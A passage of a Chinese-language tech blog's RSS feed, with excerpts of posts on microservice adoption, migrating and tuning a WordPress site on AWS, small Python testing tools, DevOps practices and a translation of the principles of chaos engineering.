本系列共计 4 篇，分别是《我们如何衡量一个微服务实施的成功》，《成功微服务实施的组织演进》，《成功微服务实施的技术技术演进》，《微服务架构演进中的经验和反思》。本场 Chat 是第一篇《我们如何衡量一个微服务实施的成功》，由于保密的原因，具体的客户、项目、人员名称均为化名。
应用系统的架构的维护成本是如何增长的 # 我们采用架构的规模（可以用功能数量或者代码行数来衡量），以及投入的维护成本（人员、资金、时间）来构建一个坐标。就可以做出一个简单的对比：
在一开始（O点），单体应用的构建成本是相对低廉的，因为并不需要做分布式。而一开始就做微服务的架构，势必会因为分布式的复杂性而产生额外的成本（O1点）。
随着应用规模的增长，相应的规模就会有相应的维护成本。随着这个规模的上涨，势必会迎来一个 X 点。使得单体应用和微服务应用的维护成本一致。这也说明在这一点之前，单体应用的优势十分突出。
从架构模型上看，单体应用的规模和维护成本是指数上升的，因为规模所带来的依赖使得风险不断汇聚，导致交付速度降低，部署风险增大。因此，它的维护成本以指数形式增长。然而微服务应用是由多个简单系统组合而成，它的依赖程度较低，单独的交付效率和部署风险可控，因此，他的维护成本以对数形式增长。
由于微服务的这种特性，当两种应用架构的规模超过X点之后，它们的维护成本则相去甚远，势必会迎来一个维护成本的极限 X' 点，从而约束了应用规模的极限。
而在这个情况下，就是大多数企业转型微服务的驱动力：原先的应用增长模式无法应对规模的增长。
所以，我们可以看到，大多数的企业是从 O 点出发，沿着红线走到 X' 点，然后开始进行微服务的改造。以换取应用的增长规模。</description></item><item><title>讨论微服务之前，你知道微服务的 4 个定义吗？</title><link>https://wwww.guyu.me/posts/2018-09-14-four-definitions-of-microservices/</link><pubDate>Fri, 14 Sep 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-09-14-four-definitions-of-microservices/</guid><description>关于“什么是微服务”的问题，其实并没有一个统一的认识。这些年在不同的场合里和不同背景的朋友都在探讨微服务。但聊得越多，就越发现大家聊的不是同一回事。和 DevOps 一样，“微服务”也是一个内涵十分广泛的词。本文从“Microservice“这个概念的源头出发，总结了 4 个常用的微服务定义。
James Lewis 原始版的微服务 6 大特征 # 这个版本起源于2012年，这里首先要注意年份，那时候还没有 Docker，而且 Netflix 的微服务化过程也在这个概念提出之前——2008年就开始了，那时候甚至连 DevOps 还没发明出来。James Lewis 在波兰第 33 次 Degree in Kraków 会议上分享了一个案例，名称是 “Micro Services - Java, the Unix Way”。在这个分享里， James Lewis 分享了在 2011 年中参与的一个项目中所采用的一系列实践，以 UNIX 的哲学重新看待企业级 Java 应用程序，并且把其中的一部分称之为“ Micro-Services ”。
这个时候的微服务所用的单词和我们现在所用的 Microservices 这个单词有所不同。一方面，采用 Micro 作为形容词，是和 Monolithic 相对，而不是和 Macro 相对是源于操作系统这门大学课程。我们知道，现代的操作系统课程都是以 UNIX 作为案例进行讲解的。而这两个单词来自于“微内核”（Micro-Kernel）和“宏内核”（Monolithic kernel）的比较。而非常见的“微观经济学”和“宏观经济学”中的 Micro 和 Macro 两个相对应的单词。
另一方面，服务要以复数形式出现，表示的是一个以上。由于汉语里单复数是同型的，所以我们在翻译的时候会出现问题。因此，“微服务”在作为架构的形式出现的时候，我们会用“微服务架构”称呼。单个的微服务从概念上为了和 SOA 以及其它领域的“服务”有所区分，会以“单个微服务”以示区别。而”微服务“单独拿出来是被看作为一系列技术实践的总称。
在这个分享里，James Lewis将所实践的“微服务架构”总结为 5 大特征：
Small with a single responsibility —— “小到只有单一原则”
在这个特征里，关于微服务有多小有两个标准：
第一个标准是：如果一个类复杂的超过一个开发人员的理解范围，那么它就太大了，需要被继续拆分。
第二个标准是：如果它小到可以随时丢弃并重写，而不是继续维护遗留代码，那么它就足够小。这个标准有个很重要的原则就是 Rewrite over Maintain，即“重写胜于维护”。
Containerless and installed as well behaved Unix services —— “去容器化并且作为 Unix Service 安装”
在这个特征中，James Lewis 提倡采用 Jetty 这样的工具集成到 Maven 里，可以很方便的调试或者部署。然后打包成一个可执行的 JAR 包并以 UNIX 守护进程的方式在系统启动时执行。</description></item><item><title>公有云(AWS)上的生产环境架构优化案例和迁移套路总结</title><link>https://wwww.guyu.me/posts/2018-08-08-architecutre-optimization-case-study/</link><pubDate>Wed, 08 Aug 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-08-08-architecutre-optimization-case-study/</guid><description>本文是我在 gitchat 上的文章云计算生产环境架构性能调优和迁移套路总结（以 AWS 为例）的后半部分，本文对原文有所修改和总结。交流实录请点击这里。
在AWS 上的生产环境性能分析案例一文中，记录了我对客户应用生产环境的一次性能分析。接下来，我们要根据所发现的性能问题进行架构优化，以提升可用性和性能。同时，这篇文章也总结了应用迁移到云上的套路。
设计云计算平台迁移计划和方案 # 将应用程序迁移到云计算平台上主要的目的是把自行构建的高风险高成本应用以及组件替换为云计算平台上的高可靠性低成本组件/服务。
应用架构的迁移有两种方案：
一种是整体一次性迁移，即重新实现一个架构并完成部署，然后通过金丝雀发布或者蓝绿发布切换。这种方式的好处是简单，直接，有效，一开始就能按照最佳实践构建应用架构。而且对于现有系统来说影响不大。但如果方案没设计好，容易造成高级别的风险，所以应当进行大量的测试以确保可靠性。
另一种是持续部分迁移，每次引入一点风险，保证风险可控，但缺点就是优化步骤较多。虽然持续部分迁移步骤多，但是总体时间并不一定会比整体迁移更高。
**注意：**由于自动化基础设施和架构设计会带来一些副作用，特别是配置间的耦合。因此，对于生产环境的直接优化要慎用自动化。如果一定要用，请务必在测试环境上做好测试。但如果你能做到自动化并且有完好的测试，不如直接做整体一次性迁移方案得了。
一般说来，一个完整的云平台迁移方案会分为以下三大阶段：
第一阶段：构建高可用架构以实施水平扩展，从而保证了应用的稳定运行。
第二阶段：引入 APM 并根据 APM 数据进行定向优化，采用云计算的服务来优化应用的资源使用。
第三阶段：构建应用端的持续部署，构建 DevOps 的工作模式。
这三个阶段是大的顺序，而每个大的阶段里又会相互掺杂一些其它阶段的内容。但无论什么样的迁移方案，一定要通过度量进行风险/收益比排序，最先完成代价最小，收益最大的内容。
第一阶段：构建高可用架构 # 我们之前说过，一个应用架构的第一追求就是业务的连续性和抗风险能力。一个高可用的架构能够在你的应用面对压力的时候从容不迫。因为如果资源满负荷运转，新的请求会因为没有可用资源而导致排队。这是常见的停机或者性能降低的原因。这就是 AFK 扩展矩阵常说的 X 轴扩展：通过复制自己扩展资源从而达到降低排队等待的时间。此外，水平扩展出来的机器同样也是一个预留资源，能够提高应用的可用性。应用架构不仅仅是应用程序的事情，也包含着资源的分配，二者是相辅相成的。
一般会经历如下几步：
第一步，有状态和无状态分离 第二步，牲畜化（Cattlize）应用实例 第三步，自动化水平扩展（AutoScaling） 第一步：有状态和无状态分离 # 先回顾一下当前应用的架构 ： 状态分离的目标是把有状态的组件和无状态的组件分开，以便在做复制的时候降低不一致性。最简单的判定办法是：如果复制当前的虚拟资源，并通过负载均衡随机分配请求访问，哪些部分会造成不一致。
常见的有状态内容比如数据库，上传的文件。所以，我们要把它们独立出来。在“萨瓦迪卡”的例子中，我们首先把数据库独立了出来。如下图所示：
在这个过程中，我们采用 RDS 而不是另外一个 EC2 上构建一套 MySQL 来完成数据库的分离。最主要的原因就是 RDS 提供了更好的可用性和数据库维护支持，例如自动备份，更多的监控指标，更自动的数据库迁移和维护窗口等。我们采用 Aurora 引擎的 MySQL 模式，这可以将数据库做成一个集群并让另外一个只读分片，降低数据库的负担。
在分离数据库的时候，要注意以下几点：
数据库分离的性能基线就是在同样的负载测试下，不能够比没分离之前更差。 数据库的网络建立在一个私有的子网中，除了应用子网内的 IP 不能访问数据库，从而提高安全性。 构建一个私有域名来访问数据库，这样可以固定应用的内部配置，减少对配置的修改。同时也给外部切换数据库主备等留下了更灵活的空间。 注意对原有数据库 MySQL 配置信息的复制，这会导致很大程度上的性能差异。 对于数据较大的数据库启动而言，会有一个几分钟的热身（Warm up）时间，这会导致性能下降。所以，做切换的时候提前启动数据库以做好准备。 不要用默认的 root 账户作为应用的访问账户。 由于 RDS 可以在不影响数据完整性和一致性的情况下降低使用配置，在最开始的时候采用较高的配置。随着优化的不断进行，可以采用维护时间窗口（Maintenance Time Window）在低流量时段对 RDS 实例的配置进行降级，以节约成本。 完成了数据库的隔离，我们就可以依法炮制文件的隔离了。最简单有效的方案是把文件存储在对象存储服务中。AWS S3 就是这样一种服务。避免自己构建共享文件系统或者共享存储设备。
文件相较于数据库来说，占用的内存资源和 CPU 资源较少，大部分的处理为 IO 处理，只要网络和设备的 IOPS 足够。一般不会出现大的问题。
为了降低文件隔离带来的问题，在迁移文件的时候尽量保证文件目录结构不变，只改变文件访问根（root）的位置。对于文件来说，可以通过多种方式：
如果有对应的文件存储位置修改功能，可以通过修改全局文件存储位置实现。 如果有反向代理，可以通过修改反向代理的配置来通过重定向实现。 对时间敏感的文件读写，可以根据日期和时间建立文件夹。 如果有七层的负载均衡或者 CDN 可以通过路径匹配来实现、 在“萨瓦迪卡”的例子里，我们通过 CDN 来实现了文件的隔离。将文件存储在 AWS S3 上，并且用 CloudFront 作为 CDN。用路径匹配的形式让请求通过访问 S3 而不是虚拟机实例来降低虚拟机的 IO 请求，再加上 CDN 的缓存，这就可以大大减少虚拟机实例的负担，也提升了用户的体验。最终的架构如下图所示：</description></item><item><title>公有云(AWS)上的生产环境性能分析案例</title><link>https://wwww.guyu.me/posts/2018-08-07-performance-analysis-case-study/</link><pubDate>Tue, 07 Aug 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-08-07-performance-analysis-case-study/</guid><description>本文是我在 gitchat 上的文章云计算生产环境架构性能调优和迁移套路总结（以 AWS 为例）的前半部分，本文对原文有所修改和总结。交流实录请点击这里。
案例背景 # 案例是一个泰国网站的生产环境（请脑补一句“萨瓦迪卡”，为了叙述方便，下文中均以&amp;quot;萨瓦迪卡&amp;quot;指代这个网站。）“萨瓦迪卡”是一个 采用 Wordpress + MySQL搭建的应用。这个遗留系统已经工作了五年。客户已经把在其它 VPS 上平移到 AWS 上。平移（lift and shift）是说原样复制，而迁移（migration）还要进行改造。而客户唯一发挥 AWS 优势的一点就是用了一个配置很高的 EC2 虚拟机 —— m4.4xlarge。这样一台配置的虚拟机有 16 个虚拟 CPU，64 GiB 的内存，以及 2000 Mbps 的网络带宽，最高 3000 IOPS 的 200GiB 的块存储设备（也就是硬盘）。
知识点： GiB 是用二进制计算的，GB 是用十进制计算的。1 GiB 是 2的30 次方，而1 GB 是10 的 9 次方，1 GiB 略大于 1GB。 而且，AWS 的 FreeTier 免费计划是按 GB 计算的哦！
除了基本的网络和虚拟机以外，“萨瓦迪卡” 的所有东西都放在一台虚拟机上。没错，是所有东西——Web 服务器，反向代理，数据库，上传的文件——都放在一台虚拟机上。唯一个一个负载均衡用来承载 HTTPS 证书，没有使用集群，没有高可用，没有数据库/应用分离，没有防火墙，没有 WAF，没有 APM，没有 CDN 而且，没有持续交付流水线，所有部署都要 ssh 到机器上进行操作。如图所示：
“萨瓦迪卡”的生产环境可以被认为是一个裸奔的肉鸡。我曾经一度它已经被轮番入侵很久了，只是还没有被发现而已。而且，“萨瓦迪卡”生产环境的唯一一台服务器的内存率使用经常超过 95%，我很担心它的状况，任何一个小的 DoS，都不需要 DDoS，就可以让它整站宕机了。
我于是把我的担忧汇报给了客户，客户也意识到了问题。在我发现问题之前的一个月就启动了“萨瓦迪卡”的翻新（Revamp）项目，让这个应用保持原样（Keep it as is），直到 6 个月后新项目上线，替换掉当前应用。
然而，没想到我一语成谶。一天，“萨瓦迪卡”被删库了！
&amp;ldquo;删库？别慌！&amp;rdquo; # 作为一个运维工程师，最悲催的事情就是“人在家中坐，锅从天上来”。这天是世界杯的某一场小组赛，而我刚吃完晚饭正在洗碗。突然被客户的 P1 告警（P1 - Priority 1，最高级别告警）惊吓到，得知“萨瓦迪卡”被删库了。
判断的依据是：
“萨瓦迪卡”主页打开是 Wordpress 的初始化安装页面。证明应用是正常的，数据不在了。 在服务器上用 MySQL 客户端登录数据库，找不到“萨瓦迪卡”的数据库。 还好客户每天有全量数据备份，于是客户快速从全量备份恢复了数据库，只是缺少了从备份点到故障点的业务数据。全量数据库的备份文件有 10 GiB，这么大的表如果采用 mysqldump 会因为锁表而导致 10 分钟左右的停机时间（别问我怎么知道的）。</description></item><item><title>一怒之下，我又写了一个开源流量测试工具</title><link>https://wwww.guyu.me/posts/2018-07-07-why-do-i-write-wade/</link><pubDate>Sat, 07 Jul 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-07-07-why-do-i-write-wade/</guid><description>继一怒之下我写出了 Vivian（详见“测试驱动开发 Nginx 配置”）之后。又在等待客户审批流程的时间里自己写了一个流量测试工具。
背景 # 客户的站点是通过 Wordpress 搭建的，这个应用放在一台 EC2 虚拟机上。奇葩的是，这个应用的 MySQL 数据库也在这台虚拟机上，之前做过一次 RDS 迁移，失败了，原因未知。看起来这个应用和数据库就像筷子兄弟一样，不离不弃，而且没有办法通过 AutoScaling Group 进行水平扩展。也就是说，所有的东西都在一台虚拟机上。
我所要做的，就是把这个架构重新变成可自动水平扩展且高可用高性能有缓存低消耗具备监控和更加安全且有版本控制并可以通过持续交付流水线来半自动部署的架构。你可以重新读一下上一句加粗文字的内容。没错，目前他们连版本控制都没有，所有的操作在服务器上通过 mv 之间 scp 进行。
很不巧的时候，这个“筷子兄弟”应用在上周开始，晚上随机的 Down 机，表现为数据库被删。但通过日志可以发现，是由于内存资源不足导致的 MySQL 数据引擎加载不了导致的。
由于需要做“筷子兄弟”拆分手术，目的是要把数据库和应用程序分开，并且需要进行一些服务的重启和拆分。这些操作中会导致停机时间，为了能够度量这个停机时间，便于做出更好的决策，客户希望在测试环境上能够通过模拟生产环境的工作状态来完成这个任务。我设计了方案，包括以下几点：
知道每一个可能引起停机的操作引起停机的时长。 测试 RDS 能带来多少的性能提升。 找出整个架构引起停机的根本问题。 在 500 个并发用户访问的情况下，会出现的性能拐点。 能够度量应用的资源损耗。 客户已经购买了 NewRelic 和 Flood.io （我在 17 期技术雷达里提交的条目，叉会腰。）但是 Flood.io 的账号分配需要一个额外的审批才可以使用，也就是说，我得等到第二天才能使用。
我想，也许 github 上会有这样的工具能够满足我这个简单的需求，搜了一圈，没有合适的。
于是，一怒之下，我用了大概两个小时的时间用 Python 编写了这样一个测试工具。
工具的设计 # There are only two hard things in Computer Science: cache invalidation and naming things.
&amp;ndash; Phil Karlton
命名是一件很困难的事情。于是，为了纪念这个事情，一开始我用提出这个需求的客户的名字（Dave）来命名它，但可能不太好记忆。所以最后还是用 Wade （Web Application Downtime Estimation）作为这个工具的名字。它很简单，可以在https://github.com/wizardbyron/wade找到。
如果我需要知道停机时长，我必须要先能够持续不断的发出 http 请求，并记录下相应 状态不是 200 OK 的返回。我并不希望应用是一个死循环，因此我需要能够加入时间控制。我期望用下面的这样的方式来使用：
wade -t 10 -u https://www.google.com
其中，-t 代表时间，10 代表持续分钟，-u 表示要测试的 url。我期望这个工具能够连续的帮我输出每次请求的时间和 HTTP 状态字。</description></item><item><title>采用 DevOps 故事落地 DevOps</title><link>https://wwww.guyu.me/posts/2018-06-24-devops-story/</link><pubDate>Sun, 24 Jun 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-06-24-devops-story/</guid><description>在 2009 年第一届 DevOpsDays 上，《敏捷教练》的作者 Rachel Davies 作为第一届 DevOpsDays 上的第一位分享嘉宾。分享了在 BBC 采用用户故事跟踪非功能需求的经验。然而这一实践并不如 DevOps 的其它实践那样广泛。这个实践实际上很简单，就是把非功能需求做为用户故事的 AC 放入故事卡里。
在我过去实践 DevOps 的经历里，发现每次开始的时候都需要团队做同样的一些事情。而这些事情往往是和用户故事独立的，不能作为用户的一部分体现在工作量里。但这些事情又提升了团队之间的 DevOps 能力，于是，我把这一类的工作固化为 DevOps 故事用来落地 DevOps 实践，而且 DevOps 故事同样遵循并体现 CLAMS 原则的。
所谓 CLAMS 原则，指的是：
Culture（文化） Lean（精益） Automated （自动化） Measurement （度量） Sharing （分享/共担责任）
我把一个团队是否遵循 CLAMS 原则当做是否正确实践 DevOps 的标准之一。
DevOps 故事由 DevOps Epic （DevOps 史诗）和 DevOps Story （DevOps 故事）组成。和用户故事对应，DevOps 史诗故事可以依据具体情况的不同拆分成不同的 DevOps 故事。
而无论 DevOps 史诗 还是 DevOps 故事，都包含以下三个因素：
一定包含 Dev 和 Ops 两个方面
一定包含 Dev 和 Ops 核查的内容
一定包含可以度量的内容
编写 DevOps 史诗故事 # DevOps 史诗故事对于大部分组织来说是类似的，因为这些场景是 DevOps 的核心特征。也就是说，当你的团队完成了 DevOps 史诗故事。那么，你的团队就可以被称作是 DevOps 团队。
一个 DevOps 的史诗故事格式如下：</description></item><item><title>测试驱动开发 Nginx 配置</title><link>https://wwww.guyu.me/posts/2018-06-12-tdd-in-nginx/</link><pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-06-12-tdd-in-nginx/</guid><description>2017年中，我参与了一个亚太地区互联网公司并购的项目，客户收购了亚太地区 7 个国家的同行业互联网企业和产品。我作为其中的 DevOps 咨询师和 DevOps 工程师，和客户一起完成并购后的产品迁移和技术能力提升的设计、实施和培训。
客户希望采用新的统一产品，并根据不同地区的业务特色进行一些定制，与此同时，需要进行数据迁移以保证业务可以继续运行。其中一个很关键的步骤是把原系统的 URL 通过重定向的方式到新的产品中，因为有很多的第三方链接和搜索引擎依然保留了原系统中的链接。
初步统计了一下，将近有3000多个 URL 需要重定向，光是规则和正则表达式就写了 400 多条（没有统一模式的 URL 害死人啊），这就引发了一个问题：我该如何验证这些规则和覆盖这些 URL ？此外，大量的重定向不光对用户来讲不是很好的体验，如果我要优化这些规则，我如何保证我当前的转发规则不被破坏？
解决方案 # 最早，我们写了一个 Shell 脚本，用 curl命令来验证这些 URL，最初只需要验证 200 条就可以满足需求，时间也不到两分钟。后来，我们采用了一个 Excel 文件来跟踪这些 URL，产品经理只需要把新的重定向 URL 补充到上面，我们就依据这些 URL 来开发 nginx 的重定向规则。
这让我想到了 TDD：先写出一个自动化测试用例，然后修复这个自动化测试用例。更好的是，有了自动化的测试做保护，你可以放心和安全的对代码进行重构。
此外，随着更多的 URL 需要重定向，这个数字在不断的增加。原先的 Shell 脚本执行的时间也从最初的 2 分钟增长到了15分钟。
现有的工具满足不了要求，一怒之下，我决定开发一个自己的工具。它必须具备以下特点：
可以通过文件读取规则，进行大批量验证。 多线程并发执行，可以提升效率。 很容易和 CI 集成。 能帮我做一定程度的重定向优化分析。 于是，我在一个周末的时间用 Python 写下了 vivian： 一个多线程的批量自动化重定向验证工具。
它把原先的 15 分钟的验证时间缩短到了 17 秒，效率提升了 5294 % !!
此外，我把测试用例集成到了代码库里。并把 vivian 提交到了 pipy，这样我就可以通过 pip 在初始化 CI 上安装了。也无需增加到代码库里变成一个需要维护的代码脚本。
选择 Python 的原因主要是因为相较于 Ruby, Go, Java, NodeJS 来说。Python 的语言环境比较稳定，几乎每种 Linux 都包含 Python 的运行环境，且容易安装和集成。
安装使用 Vivian # 安装
pip install vivian 使用
vivian -f example.csv test.</description></item><item><title>云原生 DevOps</title><link>https://wwww.guyu.me/posts/2018-06-02-cloudnative-devops/</link><pubDate>Sat, 02 Jun 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-06-02-cloudnative-devops/</guid><description>回头遥望，DevOps 将迎来自己的十岁生日。对于整个行业，这十年 DevOps给 IT 行业所带来的冲击并没有因为时间的增长而放慢革新的脚步，反而越发的剧烈和深远。
随着大规模的互联网应用不断在云计算平台上遇到挑战，新的应用架构模式呼之欲出，在众多的实践和方法论中，CloudNative 应用则是其中的佼佼者。 CloudNative 应用结合了 DevOps 社区在互联网上的最佳实践。
然而，仅仅有了构建 CloudNative 应用的方法论是不够的。一方面，没有采用 DevOps 从组织和流程的角度优化企业的流程，仍然会出现 “DevOps 之痛”，并阻碍着互联网转型。另一方面，“经典的”企业级 DevOps 同样面临着 CloudNative 带来的新挑战。于是我们可以看到，很多具有 DevOps 基因的互联网企业开始刻意的进行敏捷和 DevOps 转型。而率先完成 敏捷和 DevOps 的企业在进行 云原生 应用改造和技术革新上带来了新的问题。
这就对 DevOps 在云原生的环境下提出了新的课题和实践诉求，我们如何在云原生的环境下实践 DevOps 以达到更有生产力的表现？
本文将从最新一期的技术雷达中，试图勾画出 DevOps 在云原生的环境下的特性、未来的趋势以及相应的实践。
背景：不断蔓延的云环境复杂性 # 本期技术雷达主题之一是：不断蔓延的云环境复杂性。
随着更多的云计算厂商的诞生，差异性质的服务将会越来越少。而在马太效应下，云计算平台之间也将迎来大规模的整合和重组。云计算平台之间竞争不断加剧，使得我们对云计算有了更多的选择，然而带来的是云平台之间在兼容性上的问题。我们虽然可以看到 Docker 这样的封装式解决方案，但对于整体云计算平台的编排和利用。例如网络，安全设施，服务资源间调度，却统一规范和标准。从平台的角度来看，这确实是避免客户流失的有效手段。但留给用户的选择空间不大。
因此，跨云平台的基础设施编排工具不断出现，使得用户可以在不同的云平台之间无缝切换。随之而来的将是一个云计算的标准或者事实标准将呼之欲出，加强这个市场上的马太效应，淘汰掉小的云服务厂商，或者因为技术独特而被大的厂商收购。
如果你害怕自己的数据中心被平台所绑定，则需要花费更多的成本来维护一个云平台之间兼容性的应用系统。
SecDevOps # 本期技术雷达的另一个主题之一是：信任但要验证。
相对于企业级的可控网络和访问结点来说，在云原生的环境下，企业所面临的挑战则更为艰巨。这就好比你之前在自己小区的花丛里种花，你所面对的无非家猫家狗和小孩子的破坏。然后，你现在要在野生山林里种花，就要面对更加未知和复杂的环境。
然而，适应了企业级的应用开发和维护的开发团队并不如天生的互联网企业那般很快就能适应互联网的大丛林。
在 DevOps 运动刚开始的时候，安全并不是一个主要的 Topic，只是一系列需要注意的事项，于是在做 DevOps 实践的时候，把安全放在了最后考虑，即 DevOpsSec。随着 DevOps 的实践越来越激进，新的工具不断从社区涌现。安全作为 DevOps 的阻力则越来越大。但安全始终是绕不开的重要事情。因此，DevOps 社区尝试用同样的办法炮制和安全部门的合作以及安全实践，随后有了 DevSecOps，Sec 逐渐成为了 DevOps 实践中重要的一环。
就像我们之前讲的，面对复杂多变的云环境，安全要作为第一考量首先考量，而不是事后弥补。这一点就和我们在持续交付中探讨的“质量內建”一样。在云平台上实践 DevOps 要做到“安全內建”（Build Security In），这不单单是说我们增加几个自动化安全扫描的工具就足够的。要从系统的角度来重新思考安全在整个应用生命周期和团队的实践。ThoughtWorks 的安全社区在&amp;quot;安全內建&amp;quot;总结出了自己的实践，详细内容可以参考 buildsecurityin 网站。
在上一期的技术雷达上，我们提到了混沌工程，混沌工程是在分布式系统上进行实验的学科, 目的是建立对系统抵御生产环境中失控条件的能力以及信心。在此基础上，本期技术雷达即将提到“安全混沌工程”，安全混沌工程 将扩展了安全技术的范畴：将误报引入到生产环境网络和其他基础设施 - 例如，构建时的依赖关系中。 检查是否有能力在受控条件下识别安全故障。但在初期阶段，应谨慎使用此技术, 避免团队遇到安全问题。
另一方面，云平台服务商自己也推出了安全审计工具。Scout2 就是在 AWS 上的一款安全审计工具，可以自动帮你收集 AWS 上的配置数据以用于审计，它甚至可以帮助你生成攻击面报告。
Service Over Tools # 在企业级的 DevOps 实践中，技术实践的很大一部分内容都是引入先进的管理工具的理念。例如引入持续交付服务器，代码管理服务器，自动化测试套件等等…… 引入的工具在提高团队生产力和敏捷性的同时，也给团队带来了新的挑战：由于每家企业的组织结构和流程不同，加之团队的工程实践能力参差不齐。就导致了很多实践并没有很好的落地执行，企业自身都需要对 DevOps 引入的技术实践进一步消化。
但在云原生的场景下，我们无需去构造工具链，因为工具链本身是为最佳实践服务的。我们只需要根据自己的实践选择对应的服务就可以了，不光包含云平台自身的，也包括外部的。</description></item><item><title>翻译-混沌工程的原则</title><link>https://wwww.guyu.me/posts/2018-03-01-principlesofchaos-zh-cn/</link><pubDate>Thu, 01 Mar 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-03-01-principlesofchaos-zh-cn/</guid><description>混沌工程是在分布式系统上进行实验的学科, 目的是建立对系统抵御生产环境中失控条件的能力以及信心。
大规模分布式软件系统的发展正在改变软件工程。作为一个行业，我们很快采用了提高开发灵活性和部署速度的实践。紧跟着这些好处的一个紧迫问题是：我们对投入生产的复杂系统中有多少信心？
即使分布式系统中的所有单个服务都正常运行, 这些服务之间的交互也会导致不可预知的结果。 这些不可预知的结果, 由影响生产环境的罕见但破坏性的真实事件复合而成，令这些分布式系统存在内在的混沌。
我们需要在异常行为出现之前，在整个系统的范围内找出这些弱点。 系统弱点包括以下形式: 当服务不可用时的不正确回退设置;不当的超时设置导致的重试风暴;由于下游依赖项流量过载导致的服务中断;单点故障时的级联失败等。我们必须主动的发现这些重要的弱点，在这些弱点通过生产环境暴露给我们的客户之前。我们需要一种方法来管理这些系统固有的混沌, 通过增加的灵活性和速率以提升我们对生产环境部署的信心, 尽管系统的复杂性是由这些部署所导致的。
基于经验和系统的方法解决了分布式系统在规模增大时引发的混乱问题, 并以此建立了对这些系统抵御现实条件的能力的信心。 我们通过在受控实验中观察分布式系统的行为来了解它的特性。 我们称之为混沌工程。
混沌工程实践 # 为了具体地解决分布式系统在规模上的不确定性，可以把混沌工程看作是为了揭示系统弱点而进行的实验。这些实验遵循四个步骤：
首先，用系统在正常行为下的一些可测量的输出来定义“稳态”。 假设这个稳定状态在控制组和实验组都会继续存在。 引入反映真实世界事件的变量，如服务器崩溃、硬盘故障、网络连接断开等。 试图通过假设控制组和实验组之间的稳态差异来反驳这个假设。 破坏稳态的难度越大，我们对系统行为的信心就越强。如果发现了一个弱点，那么我们就有了一个改进目标。避免在系统规模化之后被放大。
高级原则 # 以下原则描述了应用混沌工程的理想方式，这些原则基于上述实验过程。 对这些原则的匹配程度能够增强我们在大规模分布式系统的信心。
建立一个围绕稳定状态行为的假说 # 要关注系统的可测量输出, 而不是系统的属性。 对这些输出在短时间内的度量构成了系统稳定状态的一个代理。 整个系统的吞吐量、错误率、延迟百分点等都可能是表示稳态行为的指标。 通过在实验中的系统性行为模式上的关注, 混沌工程验证了系统是否正常工作, 而不是试图验证它是如何工作的。
多样化真实世界的事件 # 混沌变量反映了现实世界中的事件。 我们可以通过潜在影响或估计频率排定这些事件的优先级。 考虑与硬件故障类似的事件, 如服务器宕机、软件故障 (如错误响应) 和非故障事件 (如流量激增或缩放事件)。 任何能够破坏稳态的事件都是混沌实验中的一个潜在变量。
在生产环境中运行实验 # 系统的行为会依据环境和流量模式都会有所不同。 由于资源使用率变化的随时可能发生, 因此通过采集实际流量是捕获请求路径的唯一可靠方法。 为了保证系统执行方式的真实性与当前部署系统的相关性, 混沌工程强烈推荐直接采用生产环境流量进行实验。
持续自动化运行实验 # 手动运行实验是劳动密集型的, 最终是不可持续的，所以我们要把实验自动化并持续运行。 混沌工程要在系统中构建自动化的编排和分析。
最小化爆炸半径 # 在生产中进行试验可能会造成不必要的客户投诉。虽然对一些短期负面影响必须有一个补偿, 但混沌工程师的责任和义务是确保这些后续影响最小化且被考虑到。
混沌工程是一个强大的实践, 它已经在世界上一些规模最大的业务系统上改变了软件是如何设计和工程化的。 相较于其他方法解决了速度和灵活性, 混沌工程专门处理这些分布式系统中的系统不确定性。 混沌工程的原则为我们大规模的创新和给予客户他们应得的高质量的体验提供了信心。
欢迎加入混沌社区的 Google 讨论组和我们一起讨论这些原则的应用。</description></item><item><title>Serverless 风格的微服务的持续交付</title><link>https://wwww.guyu.me/posts/2018-02-01-serverless-continurous-delivery/</link><pubDate>Thu, 01 Feb 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-02-01-serverless-continurous-delivery/</guid><description>“Serverless 风格微服务的持续交付（上）：架构案例”中，我们介绍了一个无服务器风格的微服务的架构案例。这个案例中混合了各种风格的微服务
架构图如下：
在这个架构中，我们采用了前后端分离的技术。我们把 HTML，JS， CSS 等静态内容部署在 S3 上，并通过 CloudFront 作为 CDN 构成了整个架构的前端部分。我们把 Amazon API Gateway 作为后端的整体接口连接后端的各种风格的微服务，无论是运行在 Lambda 上的函数，还是运行在 EC2 上的 Java 微服务，他们整体构成了这个应用的后端部分。
从这个架构图上我们可以明显的看到 前端（Frontend）和后端（Backend）的区分。
持续部署流水线的设计和实现 # 任何 DevOps 部署流水线都可以分为三个阶段：待测试，待发布，已发布。
由于我们的架构是前后端分离的，因此我们为前端和后端分别构造了两条流水线，使得前后端开发可以独立。如下图所示：
在这种情况下，前端团队和后端团队是两个不同的团队，可以独立开发和部署，但在发布的时候则有些不同。由于用户是最后感知功能变化的。因此，为了避免界面报错找不到接口，在新增功能的场景下，后端先发布，前端后发布。在删除功能的场景下，前端先发布，后端后发布。
我们采用 Jenkins 构建我们的流水线，Jenkins 中已经含有足够的 AWS 插件可以帮助我们完成整个端到端的持续交付流水线。
前端流水线 # 前端持续交付流水线如下所示：
前端流水线的各步骤过程如下：
